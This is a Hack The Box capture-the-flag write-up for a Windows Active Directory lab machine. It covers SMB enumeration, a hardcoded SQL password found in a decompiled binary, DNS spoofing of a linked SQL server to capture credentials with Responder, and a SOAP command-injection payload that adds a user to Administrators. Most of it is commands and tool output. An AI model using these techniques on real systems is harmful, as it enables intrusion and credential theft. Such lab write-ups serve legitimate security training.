---
layout: post
title: "HTB - Overwatch"
categories: [writeup]
---

# Machine Information

# Nmap Scan
### S200401.overwatch.htb
```
PORT      STATE SERVICE       VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-12 12:17:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-12T12:18:55+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info:
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-12T12:18:15+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2026-03-12T12:18:55+00:00; +2s from scanner time.
| ms-sql-info:
|   10.129.244.81:6520:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-12T12:16:37
|_Not valid after:  2056-03-12T12:16:37
| ms-sql-ntlm-info:
|   10.129.244.81:6520:
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
53187/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
53188/tcp open  msrpc         Microsoft Windows RPC
53195/tcp open  msrpc         Microsoft Windows RPC
53212/tcp open  msrpc         Microsoft Windows RPC
63266/tcp open  tcpwrapped
63268/tcp open  tcpwrapped
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-12T12:18:16
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
```
# Initial Enumeration
The reconnaissance phase start with `SMB` enumeration. Interestingly, the `guest` account has read access to a non-standard share named `software$`.
```bash
~/HTB/Windows/Overwatch $ nxc smb S200401 -u '' -p '' --shares
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\:
SMB         10.129.244.81   445    S200401          [-] Error enumerating shares: STATUS_ACCESS_DENIED

~/HTB/Windows/Overwatch $ nxc smb S200401 -u guest -p '' --shares
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest:
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share
SMB         10.129.244.81   445    S200401          software$       READ
SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share
```
Inside the `Monitoring` directory of share, I found several DLLs and a executable: `overwatch.exe`.
```bash
smb: \> ls
  .                                  DH        0  Sat May 17 08:27:07 2025
  ..                                DHS        0  Thu Jan  1 13:46:47 2026
  Monitoring                         DH        0  Sat May 17 08:32:43 2025

                7147007 blocks of size 4096. 961353 blocks available
smb: \> cd Monitoring\

smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 08:32:43 2025
  ..                                 DH        0  Sat May 17 08:27:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 03:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 03:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 03:38:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 03:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 21:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 08:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 08:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 08:19:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 03:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 03:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 03:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sun Sep 29 01:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 21:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 21:46:10 2017
  x64                                DH        0  Sat May 17 08:32:33 2025
  x86                                DH        0  Sat May 17 08:32:33 2025
```

```bash
smb: \Monitoring\> get overwatch.exe
getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (7.6 KiloBytes/sec) (average 7.6 KiloBytes/sec)
```
After downloading and decompressing the binary, I decompiled it using `dnSpy` which revealed a hardcoded connection string in the `MonitoringService` class.
```c#
    // Token: 0x04000003 RID: 3
    private readonly string connectionString = "Server=localhost;Database=SecurityLogs;UserId=sqlsvc;Password=TI0LKcfHzZw1Vv;";
```
# Initial Access
Armed with these credentials, I authenticated to the `MSSQL` instance on port 6520.
```bash
~/HTB/Windows/Overwatch $ mssqlclient.py sqlsvc:TI0LKcfHzZw1Vv@S200401 -port 6520 -windows-auth
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```
While the local database didn't offer immediate vertical escalation, enumeration of `Linked Servers` revealed a connection to `SQL07`.
```bash
SQL (OVERWATCH\sqlsvc  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
SQL (OVERWATCH\sqlsvc  guest@master)> enum_db
name        is_trustworthy_on
---------   -----------------
master                      0
tempdb                      0
model                       0
msdb                        1
overwatch                   0
SQL (OVERWATCH\sqlsvc  guest@master)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
```
Attempts to use the link initially failed due to a "Login timeout", suggesting `SQL07` was not resolvable or reachable.
```bash
SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
```
To exploit this, I used the `dnstool.py` to point the `SQL07` hostname to my attacker IP, then ran `Responder` to catch the incoming authentication request.
```bash
~/HTB/Windows/Overwatch $ dnstool.py S200401 -u "overwatch.htb\sqlsvc" -p TI0LKcfHzZw1Vv -dc-ip 10.129.244.81 -dns-ip 10.129.244.81 -a add -r SQL07 -d 10.10.15.12
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

~/HTB/Windows/Overwatch $ sudo responder -I tun0 -v
```
By triggering the link again, I captured the credentials for the `sqlmgmt` user.
```bash
SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
```

```bash
[MSSQL] Received connection from 10.129.244.81
[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```
These credentials proved valid for `WinRM`, granting a stable shell on the target.
```bash
~/HTB/Windows/Overwatch $ nxc ldap S200401 -u sqlmgmt -p bIhBbzMMnB82yx -M whoami
<SNIP>
WHOAMI      10.129.244.81   389    S200401          Member of: CN=Remote Management Users,CN=Builtin,DC=overwatch,DC=htb
WHOAMI      10.129.244.81   389    S200401          User SID: S-1-5-21-2797066498-1365161904-233915892-1105
```
# Initial Foothold
After logging as `sqlmgmt`, I focused on the `overwatch` process running on the system.
```bash
~/HTB/Windows/Overwatch $ evil-winrm -i S200401 -u sqlmgmt -p bIhBbzMMnB82yx
<SNIP>
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cat ..\Desktop\user.txt
55f2fade12ff839a0479792c612fbbbb
```

```bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> ps
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
<SNIP>
    123       8     1720       6472              3036   0 nssm
    649      23    32324      31396              4708   0 overwatch
<SNIP>
```
By checking the service configuration, I confirm it was managed by `nssm` and located in `C:\Software\Monitoring\overwatch.exe`.
```bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\Services | Where-Object {$_.PSChildName -like "*overwatch*"} | Get-ItemProperty | Select-Object PSChildName, ImagePath

PSChildName ImagePath
----------- ---------
overwatch   C:\Program Files\nssm-2.24\win64\nssm.exe
```

```bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\overwatch\Parameters | Select-Object Application, AppDirectory

Application                          AppDirectory
-----------                          ------------
C:\Software\Monitoring\overwatch.exe C:\Software\Monitoring
```
Decompiling the binary again, I scrutinized the `KillProcess` method. It takes a `processName` string and concatenates it directly into a PowerShell  command string without any sanitization.
```c#
    // Token: 0x06000009 RID: 9 RVA: 0x000021A8 File Offset: 0x000003A8
    public string KillProcess(string processName)
    {
        string scriptContents = "Stop-Process -Name " + processName + " -Force";
        string result;
        try
        {
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();
                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    pipeline.Commands.AddScript(scriptContents);
                    pipeline.Commands.Add("Out-String");
                    Collection<PSObject> collection = pipeline.Invoke();
                    runspace.Close();
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (PSObject psobject in collection)
                    {
                        stringBuilder.AppendLine(psobject.ToString());
                    }
                    result = stringBuilder.ToString();
                }
            }
        }
        catch (Exception ex)
        {
            result = "Error: " + ex.Message;
        }
        return result;
    }
```
This is a classic `Command Injection` vulnerability. Since the services is listening on `http://localhost:8000/MonitorService/`, I can send a `SOAP` request to trigger this method.
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> C:\Software\Monitoring\overwatch.exe
overwatch.exe :
    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Unhandled Exception: System.ServiceModel.AddressAlreadyInUseException: HTTP could not register URL http://+:8000/MonitorService/. Another application has already registered this URL with HTTP.SYS. ---> System.Net.HttpListenerException: Failed to listen on prefix 'http://+:8000/MonitorService/' because it conflicts with an existing registration on the machine.
<SNIP>
```
# Compromise overwatch.htb
To compromise the domain, I crafted a payload to add the `sqlmgmt` user to the local `Administrators` group. I used a semicolon to terminate the intended `Stop-Process` command and execute my own. 
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> $cmd = "net localgroup Administrators sqlmgmt /add"
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> $xml = @"
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>explorer; $cmd</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
"@
```
I then sent the request using `Invoke-RestMethod` targeting the local `WCF` enpoint.
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> $headers = @{"SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess"}
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> Invoke-RestMethod -Uri "http://localhost:8000/MonitorService/" -Method Post -ContentType "text/xml" -Headers $headers -Body $xml
Envelope
--------
Envelope
```
The command completed successfully, elevating `sqlmgmt` to an Administrator.
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> net user sqlmgmt
<SNIP>
Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
I then utilized `NetExec` to read the root flag. 
```bash
~/HTB/Windows/Overwatch $ nxc winrm S200401 -u sqlmgmt -p bIhBbzMMnB82yx -x "type C:\Users\Administrator\Desktop\root.txt"
WINRM       10.129.244.81   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
WINRM       10.129.244.81   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
WINRM       10.129.244.81   5985   S200401          [+] Executed command (shell type: cmd)
WINRM       10.129.244.81   5985   S200401          1a542aa2de7019bdfd8d3d786d062d8f
```
